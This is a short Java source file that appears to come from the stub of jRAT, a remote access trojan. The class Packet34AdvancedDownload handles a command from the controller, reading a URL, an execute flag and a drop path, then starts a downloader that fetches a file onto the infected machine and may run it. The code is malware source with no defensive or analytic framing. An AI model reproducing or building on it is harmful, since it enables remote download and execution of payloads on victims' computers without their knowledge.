package se.jrat.stub.packets.incoming;

import se.jrat.stub.AdvancedDownloader;
import se.jrat.stub.Connection;

public class Packet34AdvancedDownload extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		String url = con.readLine();
		boolean exec = con.readBoolean();
		String drop = con.readLine().toLowerCase();
		new AdvancedDownloader(con, url, exec, drop).start();
	}

}
